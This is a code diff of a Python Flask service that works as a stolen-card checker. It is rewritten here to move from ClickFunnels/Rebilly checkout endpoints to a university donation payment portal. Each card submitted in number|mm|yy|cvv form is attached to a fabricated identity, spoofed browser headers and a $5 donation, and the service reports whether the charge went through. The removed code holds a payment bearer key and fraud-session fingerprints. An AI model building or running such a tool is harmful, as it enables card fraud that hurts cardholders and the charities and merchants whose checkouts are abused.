@@ -1,45 +1,33 @@
-# clickfunnels_api.py
+# wallawalla_api.py
 from flask import Flask, request, jsonify
-import requests
-import re
-import time
-import random
-import base64
-from faker import Faker
+import requests, re, time, random, json, base64
 from user_agent import generate_user_agent
 
 app = Flask(__name__)
 
-def python():
-    first = ["ahmed", "mohamed", "ali", "omar", "youssef", "khaled", "abdullah", "fatma", "sara", "nour", "lina", "maya", "hala", "reem", "salma", "amr", "tarek", "hassan", "ibrahim", "karim"]
-    last = ["hassan", "ahmed", "mohamed", "ali", "ibrahim", "khalil", "said", "ramadan", "elmasry", "abdallah", "fathy", "tarek", "mostafa", "adel", "gamal"]
-    dom = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "icloud.com", "protonmail.com", "live.com", "msn.com", "aol.com", "mail.com"]
-    
-    f = random.choice(first)
-    l = random.choice(last)
-    n = random.randint(10, 9999)
-    
-    patterns = [
-        f"{f}.{l}{n}",
-        f"{f}{l}{n}",
-        f"{f}_{l}{n}",
-        f"{f}{n}",
-        f"{l}.{f}{n}",
-        f"{f}{l}.{n}",
-        f"{f}.{l}.{n}",
-        f"{f}{random.randint(1980, 2005)}"
-    ]
-    
-    return f"{random.choice(patterns)}@{random.choice(dom)}".lower()
+def gdata():
+    fnames = ["john","james","robert","michael","william","david","richard","joseph","thomas","charles"]
+    lnames = ["smith","johnson","williams","brown","jones","garcia","miller","davis","rodriguez","martinez"]
+    domains = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com","icloud.com"]
+    f = random.choice(fnames)
+    l = random.choice(lnames)
+    num = random.randint(10, 999)
+    email = f"{f}.{l}{num}@{random.choice(domains)}"
+    name = f"{f.capitalize()} {l.capitalize()}"
+    add = f"{random.randint(100,9999)} {random.choice(['Main','Oak','Pine','Maple','Cedar'])} St"
+    city = random.choice(["New York","Los Angeles","Chicago","Houston","Phoenix"])
+    zip_code = str(random.randint(10000, 99999))
+    phone = f"+1{random.randint(200,999)}{random.randint(100,999)}{random.randint(1000,9999)}"
+    return email, name, add, city, zip_code, phone
 
-@app.route('/adyn', methods=['GET'])
-def adyn_check():
+@app.route('/wallawalla', methods=['GET'])
+def wallawalla_check():
     cc_param = request.args.get('cc')
     
     if not cc_param:
         return jsonify({
             "error": "Missing cc parameter",
-            "usage": "/adyn?cc=card_number|mm|yy|cvv"
+            "usage": "/wallawalla?cc=card_number|mm|yy|cvv"
         }), 400
     
     parts = cc_param.split('|')
@@ -55,127 +43,22 @@ def adyn_check():
     
     # Format expiry year
     if len(yy) == 2:
-        exp_year = f"20{yy}"
-    else:
         exp_year = yy
+    else:
+        exp_year = yy[-2:]
     
     try:
-        x = Faker()
-        n = x.name()
+        email, name, add, city, zip_code, phone = gdata()
         r = requests.Session()
         u = generate_user_agent()
-        e = python()
         
         headers = {
-            'authority': 't.cometlytrack.com',
-            'accept': '*/*',
+            'authority': 'payment.wallawalla.edu',
+            'accept': 'application/json, text/plain, */*',
             'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
             'content-type': 'application/json',
-            'origin': 'https://www.clickfunnels.com',
-            'referer': 'https://www.clickfunnels.com/',
-            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'cross-site',
-            'user-agent': u,
-        }
-        
-        params = {
-            'space_id': '3377699765000018',
-        }
-        
-        json_data = {
-            'fingerprint': '09207158521d4a5ca00896c0e024f2f3',
-            'comet_token': '2942493487149889343233890852493992791010990969429',
-            'event': 'phone_changed',
-            'json_data': {
-                'phone': '07 58 83 99 29',
-            },
-            'url': 'https://www.clickfunnels.com/scale-monthly-step-2',
-            'referrer': 'https://www.clickfunnels.com/scale-monthly-step-1',
-            'fbp': 'fb.1.1780439334199.14120841984468307',
-            'device_type': 'mobile',
-            'os': 'Android',
-            'browser': None,
-            'language': 'fr-FR',
-            'in_iframe': False,
-        }
-        
-        response = r.post('https://t.cometlytrack.com/e/t', params=params, headers=headers, json=json_data)
-        
-        headers = {
-            'authority': 'api-order.payments.ai',
-            'accept': '*/*',
-            'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
-            'authorization': 'Bearer pk_live_oSLT21YBfpfTp6TqUF5JCZX4vxMenFyjAAjUiso',
-            'content-type': 'application/json',
-            'origin': 'https://framepay.payments.ai',
-            'reb-api-consumer': 'Rebilly/framepay@framepay.payments.ai_48f95c8',
-            'referer': 'https://framepay.payments.ai/',
-            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-site',
-            'user-agent': u,
-        }
-        
-        json_data = {
-            'method': 'payment-card',
-            'billingAddress': {
-                'firstName': n,
-                'lastName': n,
-                'emails': [
-                    {
-                        'label': 'Emails',
-                        'value': e,
-                    },
-                ],
-            },
-            'riskMetadata': {
-                'fingerprint': '6c7e7f14406ffcfa0003606def35f4e5',
-                'extraData': {
-                    'kountFraudSessionId': '5e427901a1684fc794d2863982ef898d',
-                },
-                'browserData': {
-                    'colorDepth': 24,
-                    'isJavaEnabled': False,
-                    'language': 'fr-FR',
-                    'screenHeight': 889,
-                    'screenWidth': 400,
-                    'timeZoneOffset': -120,
-                    'isAdBlockEnabled': False,
-                },
-            },
-            'leadSource': {
-                'path': 'https://www.clickfunnels.com/scale-monthly-step-2',
-            },
-            'paymentInstrument': {
-                'pan': card_number,
-                'cvv': cvv,
-                'expYear': exp_year,
-                'expMonth': mm,
-            },
-        }
-        
-        response = r.post(
-            'https://api-order.payments.ai/organizations/79e29172-59dd-4f18-82d6-28758d4a89fa/tokens',
-            headers=headers,
-            json=json_data,
-        )
-        
-        uwu = response.json()['id']
-        
-        headers = {
-            'authority': 'www.clickfunnels.com',
-            'accept': '*/*',
-            'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
-            'content-type': 'application/json',
-            'origin': 'https://www.clickfunnels.com',
-            'referer': 'https://www.clickfunnels.com/scale-monthly-step-2',
+            'origin': 'https://payment.wallawalla.edu',
+            'referer': 'https://payment.wallawalla.edu/donate/SMSUMMER',
             'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
@@ -183,54 +66,87 @@ def adyn_check():
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
             'user-agent': u,
-            'x-cf2-post-type': 'submit',
+            'x-requested-with': 'XMLHttpRequest',
         }
         
         json_data = {
-            'billing_same_as_shipping': True,
-            'product': True,
-            'contact': {
-                'email': e,
-                'phone_number': '+33758839929',
-                'first_name': n,
-                'last_name': n,
+            'items': [
+                {
+                    'designation_setid': 'SHARE',
+                    'designation': 'SMSUMMER',
+                    'data': name,
+                    'amount': '5',
+                    'anonymous': False,
+                },
+            ],
+            'item_type': 'donation',
+            'add_plan': False,
+            'is_recurring': False,
+            'metadata': {
+                'paper_receipt_requested': False,
+                'comments': 'Welson',
             },
-            'billing_address_attributes': {
-                'city': None,
-                'region_name': None,
-                'country_id': 'FR',
-                'postal_code': '10080',
-            },
-            'purchase': {
-                'product_variants': [
-                    {
-                        'id': '4177901',
-                        'quantity': 1,
-                        'price_id': '3820654',
-                    },
-                    {
-                        'id': '119714',
-                        'quantity': 1,
-                        'price_id': '1298890',
-                    },
-                ],
-                'payment_method_id': None,
-                'payment_method_type': 'payment-card',
-                'rebilly_token': uwu,
-                'process_new_order': True,
-            },
-            'skip_billing_address': False,
-            'skip_optin_track': False,
-            'redirect_to': '/onboarding-calls',
+            'payment_method': 'cc',
+            'first_name': name,
+            'last_name': name,
+            'phone': phone,
+            'email': email,
+            'street1': add,
+            'city': city,
+            'state': 'NY',
+            'postal': zip_code,
+            'country': 'US',
+            'card_number': card_number,
+            'expiration_month': mm,
+            'expiration_year': exp_year,
+            'cv_number': cvv,
+            'save_information': False,
+            'account_nickname': '',
         }
         
-        response = r.post('https://www.clickfunnels.com/scale-monthly-step-2', cookies=r.cookies, headers=headers, json=json_data)
+        response = r.post(
+            'https://payment.wallawalla.edu/api/v1/validate/transaction',
+            cookies=r.cookies,
+            headers=headers,
+            json=json_data,
+        )
+        data = response.json()
+        tras = data['transaction']
         
-        # Return the exact response text
-        return response.text, 200, {'Content-Type': 'application/json'}
+        headers = {
+            'authority': 'payment.wallawalla.edu',
+            'accept': 'application/json, text/plain, */*',
+            'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
+            'content-type': 'application/json',
+            'origin': 'https://payment.wallawalla.edu',
+            'referer': 'https://payment.wallawalla.edu/donate/SMSUMMER',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': u,
+            'x-requested-with': 'XMLHttpRequest',
+        }
+        
+        json_data = {
+            'transaction': tras,
+            'ach_authorization': False,
+        }
+        
+        response = r.post('https://payment.wallawalla.edu/api/v1/pay', cookies=r.cookies, headers=headers, json=json_data)
+        
+        # Return the message from response
+        result = response.json()
+        return jsonify({
+            "Card": card_number,
+            "message": result.get('message', 'No message')
+        })
         
     except Exception as e:
         return jsonify({
+            "Card": card_number,
             "error": str(e)
         }), 500
 
@@ -239,4 +155,4 @@ def health():
     return "OK", 200
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5004, debug=False)
+    app.run(host='0.0.0.0', port=5005, debug=False)
